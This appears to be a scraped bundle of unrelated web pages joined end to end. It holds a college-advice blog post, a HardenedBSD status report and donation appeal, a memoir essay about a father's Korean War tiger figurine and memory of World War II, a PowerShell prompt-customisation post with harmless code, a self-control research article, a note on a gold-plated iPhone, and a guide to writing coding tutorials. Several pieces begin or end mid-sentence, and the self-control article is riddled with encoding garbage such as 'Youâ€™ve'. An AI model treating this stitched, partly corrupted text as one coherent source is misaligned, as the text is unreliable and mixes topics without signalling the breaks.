</strong>Go to college? Think For Yourself.&nbsp;</h2><p>I’m going to college in a weird, transitory time. Perhaps students in 5-10 years won’t have to go to college because someone made a better system. Who knows?</p><p>Or maybe people will skip college and go to graduate school. I don’t know. I don’t have the answer.</p><p>But what I do have is <strong>my</strong> <strong>answer</strong>. Going to college is a personal question related to your goals and ambitions. Ask yourself, What the hell do I want to do? If you don’t know, ask people who know you (parents, family, friends, etc) to tell you what you’re good at or what they see you doing in 10 years.&nbsp;</p><p>They know you. That doesn’t mean they’re always right, but they can give you a valuable hint where to look and go.&nbsp;</p><p>Once you have something that you want to do (or at least some idea), see and think for yourself whether going to college makes sense.&nbsp;</p><p>If you want to do business, going to college isn’t as valuable as starting a company, and so on.&nbsp;</p><p>And again, going to college to meet people and network isn’t convincing as you can meet exceptional people on the internet. I don’t buy it. However, you could make a different type of relationship, usually more meaningful.</p><p>Most important of all, think from <a href="https://jamesclear.com/first-principles" target="_blank">first principles</a> and think for yourself.&nbsp;</p><p>What does that mean?&nbsp;</p><p>Ignore the mainstream, especially those who have not accomplished the goals you want to accomplish. If you want to become a doctor, why would you listen to an entrepreneur? If you want to become an entrepreneur, why would you listen to a lawyer? If you want …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div property="content:encoded"><p>This last month has largely been a quiet one. I've restarted work on porting five-year-old work from the Code Pointer Integrity (CPI) project into HardenedBSD. Chiefly, I've started forward-porting the libc and rtld bits from the CPI project and now need to look at llvm compiler/linker enhancements. We need to be able to apply SafeStack to shared objects, not just application binaries. This forward-porting work I'm doing is to support that effort.</p>
<p>The infrastructure has settled and is now churning normally and happily. We're still working out bandwidth issues. We hope to have a new fiber line ran by the end of September.</p>
<p>As part of this status report, I'm issuing a formal call for donations. I'm aiming for $4,000.00 USD for a newer self-hosted Gitea server. I hope to purchase the new server before the end of 2020.</p>
<p>Last year, I migrated us away from GitHub as the source-of-truth for HardenedBSD's source code and ports tree. The server hosting the source is a rather ancient one (a &gt; 10yo Dell R410) with insufficient CPU and RAM. I'm formally calling for donations to go towards a newer server to host our code.</p>
<p>I wanted to self-host our source for a couple reasons:</p>
<p>1. A single source-of-truth under our control that we can monitor and guarantee the security of.<br>
2. Provide unique access to the HardenedBSD ecosystem. We provide Tor Onion Services for those who need it. We plan to deploy other mixnets, anonymization services, and privacy-related tech for reaching HardenedBSD's infrastructure in unique ways.</p>
<p>We use Gitea as our code sharing platform. It has a similar look and feel to GitHub and provides bug reporting, wiki, and pull request features.</p>
<p>Given that HardenedBSD is downstream from FreeBSD, which shares a history greater than twenty five years, this places a huge burden on Gitea. It's having a hard time on our hand-me-down Dell R410 system and desperately needs an upgrade.</p>
<p>We appreciate every type of contribution--whether it be financial, code, documentation, advocacy, or otherwise. HardenedBSD would not exist without the continued help and support from the community.</p>

<p><span>Man is a bubble, and all the world is a storm.</span>
  <br><span>--Jeremy Taylor, Holy Dying (1651)<span></span></span></p>

<p>My father owned a gorgeous porcelain tiger about half the size of a house cat. He kept it on a shelf in our family den, where for years when I was a kid it roared down at us -- unappeasably furious (or so I always thought) at being trapped up there on its high perch, with no company except some painted beer mugs and a set of purple glass swizzle sticks. Then one day it got broken; I don't remember how. Probably my brother and I were having a skirmish and a shot went wild. I thought my father would be furious, but he didn't say a word. Carefully, almost reverently, he wrapped up the tiger and the shards of its shattered leg and put them away in a box in the basement. </p>
<!--
<div style="border:solid 1px darkslateblue; float: right; width: 454px; padding: 10px; margin: 15px;">
<img src="http://www.leesandlin.com/images/thumb-losingthewar.png">
</div>-->
<p>A long time later, years after my father died, my mother and my wife found the box when they were clearing out some old family junk. My wife knows how much I like big cats and all other varieties of predators and raptors, and she painstakingly glued the tiger back together and gave it to me as a present. It's roaring at me again as I write this: it stands on a shelf in my study, surrounded by what I hope is more congenial company -- grimacing windup monsters, maddened dinosaurs, a couple of snarling dragons with their wings outspread, and a sullen rubber shark opening wide to take a bite at passersby. The tiger seems to fit right in, but I sometimes suspect it feels shanghaied. My father hadn't got it because he was fond of tigers or because he had any interest in nature. He'd bought it in Korea, where he'd been a fighter pilot during the Korean war; his squadron had been called the Flying Tigers. </p>
<p>My wife hadn't known that; I barely remembered it myself. My father didn't like telling war stories. He'd accumulated fistfuls of medals over there, and he kept them stashed in an anonymous little plush case at the back of his closet, where they went unseen for decades. That was all part of the past, and he had no use for the past. He used to wave off any question I asked about the world before I was born, irritatedly dismissing it as if all of that were self-evidently too shabby and quaint to interest a modern kid like me. "It was a long time ago," he'd always tell me, which was as much as to say, "It's meaningless now." </p>
<p>And yet every night, whenever he'd sit down in his easy chair, he'd be confronted by the tiger glaring at him. What did he think about when he saw it? Did it remind him of the distance he'd traveled from that war, or of how incongruously bland and safe his life was now, now that he'd amassed a commercial-perfect suburban family in the depths of the American heartland? I don't know, because he wouldn't say. Whatever patina of private associations the tiger had for him is gone for good. </p>
<p>If my wife hadn't rescued the tiger it would have been cut loose to make its own way in the world -- to languish in rummage-sale boxes and end up with new owners who'd never suspect how far it had wandered through the world to reach them. But I have the feeling my father wouldn't have minded that; he never liked other people knowing his business. </p>
<p>That's the common fate of mementos. They're never quite specific enough. No matter what their occasion was, they sooner or later slip free and are lost in a generic blur: a Day at the Carnival, a Triumph at the State Finals, a Summer Vacation, My First Love. It's particularly true, I think, of the mementos of soldiers, because nobody other than a soldier remembers the details of any war once it's safely over. What really happened in Korea? I don't have the slightest idea; war just isn't an experience I'm up on. I was barely young enough to miss the Vietnam draft, and I'm old enough now that the only way I could figure in a future war is as a victim. The tiger can't preserve the memory of the bombing missions my father flew. Its odd rippling surface doesn't correspond to the landscape of North Korea, terrain my father knew by heart -- which had once saved his life: on one mission his plane malfunctioned, and he'd had to find his way back to his base with no instruments, no radio, and fuel fumes filling his cockpit. Nor does that frozen roar speak to the complex of murky policies that had sent my father into battle in the first place, thousands of miles from home. To me, the tiger is just a platitude -- if it means anything, it's a symbol for all the violence in life I've been spared. </p>
<p>People my age and younger who've grown up in the American heartland can't help but take for granted that war is unnatural. We think of the limitless peace around us as the baseline condition of life. War, any war, is for us a contemptible death trip, a relic of lizard-brain machismo, a toxic by-product of America's capitalist military system -- one more covert and dishonorable crime we commit in the third world. All my life I've heard people say "war is insanity" in tones of dramatic insight and final wisdom, and it took me a long time to realize that what they really meant was "war is an activity I don't want to understand, done by people I fear and despise." </p>
<p>But there've been places and times where people have thought of war as the given and peace the perversion. The Greeks of Homer's time, for instance, saw war as the one enduring constant underlying the petty affairs of humanity, as routine and all-consuming as the cycle of the seasons: grim and squalid in many ways, but still the essential time when the motives and powers of the gods are most manifest. To the Greeks, peace was nothing but a fluke, an irrelevance, an arbitrary delay brought on when bad weather forced the spring campaign to be canceled, or a back-room deal kept the troops at home until after harvest time. Any of Homer's heroes would see the peaceful life of the average American as some bizarre aberration, like a garden mysteriously cultivated for decades on the slopes of an avalanche-haunted mountain. </p>
<p>In our own culture the people who know what war is like find it almost impossible to communicate with the children of peace. In the last election Bob Dole was defeated in large part because of World War II -- what he thought it meant, and what he didn't see it meant to people of a later generation. To Dole, World War II was a teacher of positive values: courage, self-sacrifice, respect for authority, dedication to a common goal -- values he thought were signally absent in the soft and cynical selfishness of Clinton's generation. But it was just that cynicism that Dole couldn't crack. Everybody knew that if those values had ever really existed in America, they were only the result of some Norman Rockwell collective delusion. We're smarter now -- smart enough to see through war, anyway. We think it's a sick joke to suggest that war could ever teach anybody anything good. </p>
<p>Out of idle curiosity, I've been asking friends, people my age and younger, what they know about war -- war stories they've heard from their families, facts they've learned in school, stray images that might have stuck with them from old TV documentaries. I wasn't interested in fine points of strategy, but the key events, the biggest moments, the things people at the time had thought would live on as long as there was anybody around to remember the past. To give everybody a big enough target I asked about World War II. </p>
<p>I figured people had to know the basics -- World War II isn't exactly easy to miss. It was the largest war ever fought, the largest single event in history. Other than the black death of the Middle Ages, it's the worst thing we know of that has ever happened to the human race. Its aftereffects surround us in countless intertwining ways: all sorts of technological commonplaces, from computers to radar to nuclear power, date back to some secret World War II military project or another; the most efficient military systems became the model for the bureaucratic structures of postwar white-collar corporations; even the current landscape of America owes its existence to the war, since the fantastic profusion of suburban development that began in the late 1940s was essentially underwritten by the federal government as one vast World War II veterans' benefit. (Before the war there were 3 suburban shopping centers in the U.S.; ten years after it ended there were 3,000.) </p>
<p>Then too, World War II has been a dominant force in the American popular imagination. In the mid-1960s, when my own consumption of pop culture was at its peak, the war was the only thing my friends and I thought about. We devoured World War II comic books like Sgt. Fury and Sgt. Rock; we watched World War II TV shows like Hogan's Heroes and The Rat Patrol; our rooms overflowed with World War II hobby kits, with half-assembled, glue-encrusted panzers and Spitfires and Zeroes. I think I had the world's largest collection of torn and mangled World War II decal insignia. We all had toy boxes stuffed with World War II armaments -- with toy pistols and molded plastic rifles and alarmingly realistic rubber hand grenades. We refought World War II battles daily and went out on our campaigns so overloaded with gear we looked like ferocious porcupines. Decades after it was over the war was still expanding and dissipating in our minds, like the vapor trails of an immense explosion. </p>
<p>So what did the people I asked know about the war? Nobody could tell me the first thing about it. Once they got past who won they almost drew a blank. All they knew were those big totemic names -- Pearl Harbor, D day, Auschwitz, Hiroshima -- whose unfathomable reaches of experience had been boiled down to an abstract atrocity. The rest was gone. Kasserine, Leyte Gulf, Corregidor, Falaise, the Ardennes didn't provoke a glimmer of recognition; they might as well have been off-ramps on some exotic interstate. I started getting the creepy feeling that the war had actually happened a thousand years ago, and so it was forgivable if people were a little vague on the …</p></div>

      <p>Since I switched to Windows last year I'm using Microsoft's <a href="https://en.wikipedia.org/wiki/PowerShell">Powershell</a> as my main shell environment (on my personal laptop). At first I didn't really look into Powershell's feature until around half a year ago when I found the motivation to work on a nicer prompt and spent some time migrating my ZSH profile to Powershell. I ended up creating a different profile that suits my needs, and that I had lot of fun building.</p>
<p>That's how my prompt looks:</p>
<a rel="lightbox" href="https://sam.elborai.me/images/p/r/o/m/p/prompt2020-03-21-ec560c26.png"><figure><img title="My custom Powershell prompt" alt="" src="https://sam.elborai.me/images/p/r/o/m/p/prompt2020-03-21-ec560c26.png"><figcaption>My custom Powershell prompt</figcaption></figure></a>
<p>It has the following features:</p>
<ul>
<li>Used for both Windows and Linux subsystem</li>
<li>Current directory</li>
<li>A dynamic "main directory" used to specify the context</li>
<li>Git branch</li>
<li>Current time</li>
<li>Last command success/failure</li>
<li>Admin user label</li>
</ul>
<p>That was a cool and fun way to learn more about Powershell features, after spending all my life with sh, bash, and zsh it was refreshing to try out a different way to write shell scripts.</p>
<p><a href="https://github.com/dgellow/posh"><img alt="" src="https://sam.elborai.me/images/g/i/t/h/u/githubbadge-1705220f.png"></a></p>
<h2>Some implementation details</h2>
<h3>Left and right prompt</h3>
<p>That's a very common feature in other shells, you often have environment variables you can set to display some information on the left and/or right sides of the prompt. In the case of Powershell I had to implement <a href="https://github.com/dgellow/posh/blob/e76965d18f72d4d6cca44145fb06eaeb09535842/prompt.ps1#L3-L20">my own solution</a>.</p>
<pre><code># Renders a 2 columns layout, with $left argument written to the extreme left of the console, and $right to the extreme
# right. The cursor is restored back to its position thus should not be impacted.
function Write-Layout ($left, $right) {
    Write-Host $left -NoNewline

    $origX = $Host.UI.RawUI.CursorPosition.X
    $origY = $Host.UI.RawUI.CursorPosition.Y

    $rightX = $Host.UI.RawUI.WindowSize.Width - (Length-Without-ANSI $right)
    $rightY = $Host.UI.RawUI.CursorPosition.Y
    $position = New-Object System.Management.Automation.Host.Coordinates $rightX, $rightY

    $Host.UI.RawUI.CursorPosition = $position
    Write-Host $right -NoNewLine

    $position = New-Object System.Management.Automation.Host.Coordinates $origX, $origY
    $Host.UI.RawUI.CursorPosition = $position
}</code></pre>
<p>It took me quite some time to find out what were the correct objects to use, the documentation was a bit sparse on this. So far I haven't found any problem when using it but I may have overlooked some issues.</p>
<h3>ANSI escape code formatting</h3>
<p>I didn't want to install external dependencies for something as simple and stable as escape code formatting, I took the full list of colors and styles and created enums for them.</p>
<p>The results in a simple file that can be copy pasted around if in need for other projects: <a href="https://github.com/dgellow/posh/blob/e76965d18f72d4d6cca44145fb06eaeb09535842/formatting.ps1">formatting.ps1</a>. It should cover all the escape codes. I also added functions to make it nicer to format text and test styles and colors directly from a shell.</p>
<a rel="lightbox" href="https://sam.elborai.me/images/a/n/n/o/t/annotation-2020-08-15-181206-a356c725.jpeg"><figure><img title="Test-Styles and Test-Colors from formatting.ps1 are functions that can be used to see how ANSI escape codes look in your shell" alt="" src="https://sam.elborai.me/images/a/n/n/o/t/annotation-2020-08-15-181206-a356c725.jpeg"><figcaption>Test-Styles and Test-Colors from formatting.ps1 are functions that can be used to see how ANSI escape codes look in your shell</figcaption></figure></a>
<h3>Display the "main" parent of the current directory</h3>
<p>This feature may only make sense in the context of my personal shell as I know exactly what to expect. I <a href="https://github.com/dgellow/posh/blob/e76965d18f72d4d6cca44145fb06eaeb09535842/prompt.ps1#L43-L90">documented the function</a> that implements the selection of the "main" directory fairly well, but I can paraphrase it here. I call "current main directory" a contextual parent directory that helps me understand what the current working directory is about, while avoiding displaying the complete path. The idea is to have something as terse as possible that still gives enough context to understand where I am.</p>
<p>As an example, if I am in <code>C:\Users\Sam\Development\neocolor</code>, everything until <code>Development\neocolor</code> is redundant. I spend almost all my time in the <code>Development</code> directory so I know exactly where to find it. In this case, the "main directory" is <code>Development</code> while the current directory is <code>neocolor</code>.</p>
<p><a rel="lightbox" href="https://sam.elborai.me/images/a/n/n/o/t/annotation-2020-08-15-182428-6f2e967b.jpeg"><img alt="" src="https://sam.elborai.me/images/a/n/n/o/t/annotation-2020-08-15-182428-6f2e967b.jpeg"></a></p>
<p>The possible values are:</p>
<ul>
<li>
<code>OneDrive\{firstSubdir}</code> if I am deep in a OneDrive subdirectory. e.g: <code>OneDrive\Workspace</code> when the full path is <code>C:\Users\Sam\OneDrive\Workspace\Games\2D Tutorial</code>
</li>
<li>
<code>OneDrive</code> if I am in a subdirectory of the OneDrive location</li>
<li>
<code>{firstSubdir}</code> if I am deep in a subdirectory branch of the <code>$HOME</code> directory. e.g: <code>Anayconda3</code> when the full path is <code>C:\Users\Sam\Anaconda3\include\internal</code>
</li>
<li>
<code>Users\Sam</code> if I am in a subdirectory of the <code>$HOME</code> directory</li>
<li>what I call the top directories, for example <code>C:\Users</code> when I am in <code>C:\Users\Sam</code>
</li>
<li>special case for the root level, I only want to display <code>C:</code> in that case</li>
<li>and otherwise, just display the full path</li>
</ul>
<p>That seems to be a lot of rules when I describe them, but in practice I don't memorize them, the prompt displays just enough of the current context to let me know exactly where I am. And if I don't then <code>pwd</code> is never far away.</p>
<h3>Current git branch</h3>
<p>The simplest way I found is <a href="https://github.com/dgellow/posh/blob/e76965d18f72d4d6cca44145fb06eaeb09535842/prompt.ps1#L92-L97">this one</a>:</p>
<pre><code># Get the current git branch name
function Git-Branch {
    $raw = git status --porcelain --branch
    $branch = $raw.Split(" ").Split("...")[1]
    return $branch
}</code></pre>
<p>No issue found so far.</p>
<h3>Check administrator role</h3>
<p>I want admin shell to be marked as such in a visual way. If I <a href="https://github.com/dgellow/posh/blob/e76965d18f72d4d6cca44145fb06eaeb09535842/prompt.ps1#L99-L109">detect an administrator role</a> (Windows case) or a root user (Linux and macOS cases), I add an <code>Admin ::</code> marker on the left.</p>
<pre><code># Check if current user is an administrator
function Test-Administrator {
    if ($IsLinux -or $IsMacOS) {
        return ((id -u) -eq 0)
    }
    if ($IsWindows) {
        $user = [Security.Principal.WindowsIdentity]::GetCurrent()
        return ([Security.Principal.WindowsPrincipal] $user).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
    return ""
}</code></pre>
<h3>Support for both Windows and WSL (Windows Subsystem Linux)</h3>
<p>For some reasons it is mostly unknown by Linux users that Powershell is multiplatform and can be used as the main shell (or just a runtime for shell scripts) on Windows, Linux, and macOS. It's a bit of shame given that Powershell is quite capable and has way less ugly edge cases that make shells from the <code>sh</code> family really difficult to learn and use correctly. When checking for platform specific details, such as some specific paths, it's trivial to assert what platform we are on using <code>$IsLinux</code>, <code>$IsWindows</code>, and <code>$IsMacOS</code>.</p>
<h3>A bonus feature: a ZenMode!</h3>
<p>In addition to the general prompt, I implemented a more experimental way to interact with the shell that breaks some expected user experience and expectations. I call it the zen mode, and it looks like this.</p>
<p><img alt="" src="https://sam.elborai.me/images/a/n/n/o/t/annotation-2020-08-15-174021-39fa6e6d.jpeg"></p>
<p>It's a bit of an oddity, I don't think I've ever seen a shell behaving like this. The picture doesn't really communicate the experience of using the zen mode so here is a short video and explanation:</p>
<p><video controls="1" alt=""><source src="https://sam.elborai.me/user/pages/02.blog/14.my-powershell-profile/zenmode.mp4">Your browser does not support the video tag.</video></p>
<p>The idea is to have a shell that doesn't display a prompt at all and is as minimalistic as possible. It only shows you the current command and its output, has no other information. Why would you use such a mode? To be honest, I don't know, I was working on my prompt, then realized that I often don't want to have more details than just what I'm doing right now. In practice I haven't found myself using it that much 🤷‍♀️ but I see it as an interesting experiment.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Youâ€™ve had a long week but fortunately itâ€™s Friday and things are looking up. After grinding through the day, you stop on the way home to buy groceries for dinner. After getting the necessities, you decide on impulse to buy a dozen cookies. Youâ€™re on a diet, but you reassure yourself that youâ€™ll eat only one, two at most, to celebrate the arrival of the weekend. Once home, you enjoy your celebratory cookies as planned. Two are enough, but despite your best efforts you continue eyeballing those remaining cookies. Wouldnâ€™t they go great with milk? Maybe just one more with a glass? Before you know it, youâ€™ve polished off a dozen cookies and several glasses of milk, and youâ€™re cursing your poor self-control.</p>
<p>Look on the bright side, at least it was fat-free milk. Also, youâ€™re not alone. Research that prompted people to record whatâ€™s happening multiple times a day <a href="https://www.ncbi.nlm.nih.gov/pubmed/22149456">found</a> that self-control failures are a frequent and common occurrence of everyday life. Whether itâ€™s pizza, beer or doing anything but exercising, we all have our vices, and many of us would like to have better self-control. But what is self-control exactly? A working definition is that itâ€™s the ability to do whatâ€™s in your best interests in the long run â€“ such as managing your weight â€“ over whatâ€™s enjoyable right now â€“ such as gorging on cookies.</p>
<p>In 2007, the American psychologist Roy Baumeister put forward what has become the most influential psychological model of self-control. His <a href="https://journals.sagepub.com/doi/10.1111/j.1467-8721.2007.00534.x">strength model</a> likens willpower to a muscle. If you start doing pushups, youâ€™ll feel only a minor burn. But keep it up, and that minor burn will grow into a full-blown conflagration, at which point you wonâ€™t be able to keep going. Baumeister suggested that the same thing happens when you use self-control. If you overwork your self-control muscle, youâ€™ll eventually run out of willpower, and lose the ability to exert self-control.</p>
<p>The success of Baumeisterâ€™s <a href="https://www.penguinrandomhouse.com/books/307740/willpower-by-roy-f-baumeister-and-john-tierney/">book</a> <em>Willpower: Rediscovering the Greatest Human Strength</em> (2012), co-authored with John Tierney, suggests that the strength model resonates with many people. As a doctoral student studying self-control, I can understand why. The model eloquently explains many of our most vexing self-control failures. In the cookie example, the tumultuous week, capped off by an agonising day, sapped your willpower, leaving you unable to resist those cookies. Additionally, it conforms to our commonsense beliefs about self-control. After all, everyone knows that self-control is hard and, more often than not, we need herculean willpower to overcome temptation.</p>
<p>If the strength model is correct, what does this mean for improving your self-control? Applying the muscle analogy, one possibility might be to strengthen your â€˜self-control muscleâ€™. Researchers have <a href="https://www.ncbi.nlm.nih.gov/pubmed/22149456">tested</a> this by asking people to do things such as brush their teeth with their nondominant hand for two weeks. Such exercises are quite challenging because they force you to curtail deeply ingrained habits using â€˜inhibitory self-controlâ€™. But does self-control training actually work? According to a 2017 <a href="https://journals.sagepub.com/doi/full/10.1177/1745691617697076">meta-analysis</a> of many relevant studies, self-control training seems to be effective at improving â€˜self-control staminaâ€™ â€“ the ability to exert inhibitory self-control for longer periods.</p>
<p>So, is that the solution to greater self-discipline? Exercise your self-control muscle and get better at inhibitory self-control?</p>
<p>Your heroic efforts are likely to leave you looking more like Sisyphus than Hercules</p>
<p>Unfortunately, itâ€™s not so simple. You might have noticed how I switched back and forth between â€˜inhibitory self-controlâ€™ and the broader concept of â€˜self-controlâ€™, but the two are not synonymous. Though boosting your inhibitory self-control or â€˜willpowerâ€™ might sound appealing â€“ perhaps you imagined yourself using inhibitory self-control to force yourself not to eat the cookies, just like you would if you forced yourself to brush with the opposite hand â€“ itâ€™s not clear that inhibitory self-control actually works this way in everyday life.</p>
<p>Take the findings from a 2017 <a href="https://journals.sagepub.com/doi/full/10.1177/1948550616679237">study</a> that involved volunteers recording their daily experiences of temptation for a week. The individuals who experienced more temptation were less likely to achieve their long-term goals, even if they also reported using more inhibitory self-control. This suggests that using inhibitory self-control to resist those cookies might help you in the moment, but not in the long run. So even if you use inhibitory training (eg, the teeth-brushing challenge) to build a brawny self-control muscle, your heroic efforts are likely to leave you looking more like Sisyphus than Hercules.</p>
<p>Research in my own lab and others suggests that, if you want to improve your self-control, what you should do instead is focus on proactively reducing, rather than reactively overpowering temptation. Fortunately, there are several ways and opportunities to do this.</p>
<p>Before getting to the specifics, it helps to think in terms of a model that the American psychologist Angela Duckworth and her colleagues <a href="https://journals.sagepub.com/doi/10.1177/1745691615623247">proposed</a> â€“ â€˜the process model of self-controlâ€™. It organises self-control strategies according to when theyâ€™re initiated in the â€˜temptation generation cycleâ€™. This cycle describes the stages we must go through before we get to the point where we actually act upon a temptation â€“ see the figure below.</p>
<p>For example, to gorge on those cookies at the end of your working week, you first had to go through a <em>situational stage</em>, where you put yourself in a compromising situation with tempting cookies. From there, you transitioned to an <em>attentional stage</em>, where you directed your attention back towards those cookies. After that, you went through an <em>appraisal stage</em>, where you thought about how good those cookies would taste (especially with a glass of milk). All this led to a <em>response stage</em>, where you broke down and eventually ate all the cookies. To put it bluntly, a lot of things had to go wrong for you to end up giving in to temptation. The good news is that this means you could have applied self-control at several instances prior to when you tried and failed to exert <em>inhibitory</em> self-control (or â€˜willpowerâ€™ in everyday talk).</p>
</div><div><figure data-align="center"><img src="https://d2e1bqvws99ptg.cloudfront.net/user_image_upload/1214/Williamson-self-control-Figure.jpg" alt="" title=""><figcaption><em>Figure supplied by the author</em></figcaption></figure></div><div>
<p>Letâ€™s start with the situational stage. You donâ€™t need to be well-versed in social psychology to recognise the power of the situation. Most teachers will tell you itâ€™s easier for students to focus when they sit in the front of the classroom. With this in mind, you could have employed what Duckworthâ€™s team call â€˜situational self-control strategiesâ€™. For instance, instead of sitting in front of a box of cookies and forcing yourself not to eat them, you could have either not bought them in the first place â€“ known as â€˜situation selectionâ€™ â€“ or simply removed them from sight by placing them in a cabinet (or thrown them out) â€“ â€˜situation modificationâ€™.</p>
<p>Prior research suggests that these situational strategies are quite effective. For example, one <a href="https://www.ncbi.nlm.nih.gov/pubmed/27158155">study</a> that instructed high-school students to use situational strategies (such as removing buzzing cellphones and other temptations from sight) found that they made more progress towards their academic goals, compared with others who were simply instructed to use inhibitory self-control. Similarly, dieting <a href="https://www.sciencedirect.com/science/article/pii/S0195666318305889?dgcid=api_sd_search-api-endpoint">research</a> suggests that a simple yet overlooked way to lose weight is to avoid situations where tempting, high-calorie foods are readily available. For example, when you go grocery shopping, plan to avoid walking through the bakery. That way, you are less likely to encounter cues (pleasant smells and sights) that strengthen temptation. Think â€˜out of sight, out of mindâ€™.</p>
<p>But what if you canâ€™t use situational strategies? After all, you might have no choice but to walk through the bakery, or perhaps youâ€™ll upset your kids if you throw away the cookies. Thankfully, there are other â€˜psychological strategiesâ€™, initiated during the attentional and appraisal stages, that can be useful when the situation is uncontrollable.</p>
<p>Some clues come from Walter Mischelâ€™s classic â€˜marshmallow testâ€™ that <a href="https://www.tandfonline.com/doi/abs/10.1080/152988602317319285">involved</a> children attempting to resist a single beckoning marshmallow for 15 minutes, for the reward of two if they were successful. Among other crucial variables, Mischel and his collaborators, including the American psychologist Ozlem Ayduk, suggested that one reason some kids were so good at resisting temptation was their ability to use â€˜cooling strategiesâ€™. For instance, research in Mischelâ€™s lab found that children would wait longer if they distracted themselves by simply turning away from the marshmallow. He also found that they could wait longer if he taught them to â€˜reappraiseâ€™ the temptation by thinking of the marshmallows as â€˜puffy round cloudsâ€™.</p>
<p>Importantly, these strategies work for adults too. In a series of <a href="https://journals.sagepub.com/doi/10.1177/0146167219883606">studies</a> I conducted with Ben Wilkowski at the University of Wyoming, we found that the use of distraction (for instance, directing attention away from the temptation to go out by focusing on work thatâ€™s particularly interesting) and reappraisal (reminding oneself there will be many opportunities to go out, but only one opportunity to take the upcoming exam), along with the situational strategies discussed earlier, consistently helped college students make progress towards their long-term goals. So, it might be useful to direct your attention away from the cookies by simply picking up a book or reframing the cookies in a way that makes them seem less desirable. You know, from where Iâ€™m sitting, the cookies look kind of old.</p>
<p>Taken altogether, the message from the latest research on willpower is that itâ€™s time to stop lamenting your poor self-control and accept that you have a weak self-control muscle. It might be fun to change things up while you brush your teeth but, remember, building your self-control muscle probably wonâ€™t help you …</p></div></div></div>

Caviar is in the business of making extravagant smartphones. Earlier, it had announced a solid-gold iPhone 12 with a starting price of whopping $23,000.</p><p>Apple’s iPhone 12 will be considerably cheaper to Caviar’s Elon Musk themed iPhone 12. Apple executives confirmed last month that the iPhone 12 would go on sale slightly later than previous models of the top-selling smartphone. CFO Luca Maestri said the iPhone 12 would hit stores “a few weeks later” than the late September release date of last year’s new models.</p><p>If you have the money to burn and can trust Caviar, you can buy this ‘ártifact.’ Caviar is promising a worldwide delivery.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog-post"><p>Technical tutorials are integral to learning how to code and build software. I’m sure you’ve benefited a ton from
others’ tutorials that make you a better programmer and enable you to do things you couldn’t do before.</p>
<p>Reading tutorials is great, but there are plenty of <strong>benefits of writing your own…</strong></p>
<ul>
<li>forces you to build something (small and simple) related to what you want to learn, which can be a stepping stone to
a more complex portfolio project</li>
<li>helps out folks learning the same thing as you</li>
<li>gets your name out there in the community</li>
<li>requires that you understand what you’re doing/building enough to be able to explain it to somebody else</li>
<li>shows your competency, communication skills, etc. to potential employers/collaborators</li>
</ul>
<h2>TL;DR</h2>
<ol>
<li>Pick a tech/tool/topic you want to learn and write about</li>
<li>Develop a basic understanding of your tutorial’s subject matter</li>
<li>Start experimenting with some code</li>
<li>Build the tutorial’s project</li>
<li>Rebuild from scratch while writing an outline of the tutorial</li>
<li>Turn your outline into a rough draft</li>
<li>Spruce up the rough draft</li>
<li>Walk through the tutorial like you’re the reader</li>
<li>Publish!</li>
</ol>
<blockquote>
<p>Obviously this ain’t the only way to go about crafting a tutorial - but it’s helped me write a few and at least can
get the juices flowing for you to find your own style/process.</p>
</blockquote>
<h2>Quick thing before you dive in!</h2>
<p>I’m sure I’m missing stuff here - so I created a GitHub repo so that this process can be open source and improve over
time.</p>
<p>Here’s the link 👉 <a href="https://github.com/ryanjyost/how-to-write-a-coding-tutorial">https://github.com/ryanjyost/how-to-write-a-coding-tutorial</a></p>
<h2>Tutorial writing process</h2>
<h3>1. Pick a tech/tool/topic you want to learn and write about</h3>
<p>There are so many ways to come across potential subjects - here’s a few.</p>
<ol>
<li>What tech is being used at your work that you’re not super experienced with?</li>
<li>What’s a buzzword you keep hearing but haven’t explore yet?</li>
<li>Do you keep seeing a certain skill in job descriptions that you don’t have yet?</li>
<li>Did you recently struggle through learning something and wish there had been a tutorial to help?</li>
</ol>
<h3>2. Develop a basic understanding of your tutorial’s subject matter</h3>
<ul>
<li>Keep notes of things you’ll want to bring up in your tutorial.</li>
<li>Bookmark useful articles, other tutorials, videos, docs, etc. to easily reference and include them as links in the final piece.</li>
<li>Google and official documentation are your friends here.</li>
<li>Don’t spend too much time here going down rabbit holes. Learning more is great, but you eventually gotta move on -
you’ll learn plenty in the next steps.</li>
</ul>
<h3>3. Start experimenting with some code</h3>
<ul>
<li>Initialize a basic boilerplate project/environment so you can start writing code.</li>
<li>This is a time to play with the stuff you’re learning and eventually going to write about.</li>
<li>No need for structure, clean code, etc. Just try to make stuff happen.</li>
<li>As you get more comfortable, start to think about how the stuff you’re coding can be structured to showcase the
important aspects of your subject in the form of a small app/project.</li>
<li>If you run into anything not obvious or worth noting while getting started, jot it down - it can be a helpful tip
in your tutorial.</li>
</ul>
<h3>4. Build the tutorial’s project</h3>
<ul>
<li>Leverage your experience from the previous step.</li>
<li>This is arguably the most important part of the process - it’s the meat of what your audience will have to learn
about the subject matter.</li>
<li>While there are certainly some more complex tutorials, try to keep things as simple as possible - overly complex
apps could scare away your audience. <a href="https://medium%0A.com/webdevils-advocate/react-redux-react-router-and-rainy-day-fund-tutorial-e589f0803306">My first tutorial</a> definitely suffered from
this…</li>
<li>
<p>There’s no right way to build a tutorial project, but here are some characteristics I’d say are beneficial…</p>
<ol>
<li>It’s the simplest way to get your points/subject across.</li>
<li>It’s very easy to set up - no need to install crazy stuff or get lost in configuration. Boilerplates like
create-react-app are perfect for starting a tutorial, b/c everyone who writes React is familiar with it, or will
be quickly.</li>
<li>It has clean, organized code.</li>
<li>It has some real-world theme for the functionality, versus abstract stuff like <code>foo</code> and <code>bar</code>. Don’t get
too fancy or complicated, either.</li>
</ol>
</li>
</ul>
<h3>5. Rebuild from scratch while writing an outline of the tutorial</h3>
<ul>
<li>The goal here is to start organizing everything you’ve done so far into a logical, step-by-step order that will
represent the linear progression of your tutorial.</li>
<li>Try to rebuild the project in as structured and progressive a way as possible, so your tutorial will flow nicely and
not confuse the reader.</li>
<li>Save code snippets as you go through rebuilding the project, again trying to introduce new code in bite-size, helpful
increments.</li>
</ul>
<h3>6. Turn your outline into a rough draft</h3>
<ul>
<li>Basically, you’ll want to convert the bullet-point outline of your tutorial into a long-form version with
full-sentence instructions and code snippets included where applicable.</li>
<li>Don’t worry about adding explanations of concepts or expressive writing - a boring, no-frills set of
instructions will suffice for this step.</li>
